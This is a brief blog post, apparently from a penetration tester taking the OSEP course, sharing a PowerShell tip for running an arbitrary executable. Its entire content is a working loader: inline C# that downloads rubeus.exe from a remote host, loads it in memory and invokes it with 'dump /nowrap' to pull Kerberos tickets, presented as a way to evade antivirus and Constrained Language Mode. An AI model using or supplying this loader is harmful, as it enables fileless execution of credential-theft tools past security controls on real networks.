---
layout: post
title:  "Run an Arbitrary Executable with PowerShell"
date:   2023-12-07 05:29:53 +1100
categories: Tip
---

In the OSEP course, there's alot of evasion techniques. This one is a good combination of ease of use and success in evading things like AV and CLM.

```PowerShell
$type = @"
using System;
using System.IO;
using System.Net;
using System.Reflection;

public class Run
{
    public static void go()
    {
        try
        {
            string url = "http://192.168.45.208/rubeus.exe";

            WebClient client = new WebClient();

            byte[] executableBytes = client.DownloadData(url);
            Assembly assembly = Assembly.Load(executableBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { "dump","/nowrap" } };
                entryPoint.Invoke(null, parameters);
            }
            else
            {
                Console.WriteLine("The loaded assembly does not have an entry point.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An exception occured: " + ex.Message);
        }

    }
}
"@

add-type $type

[Run]::go()
```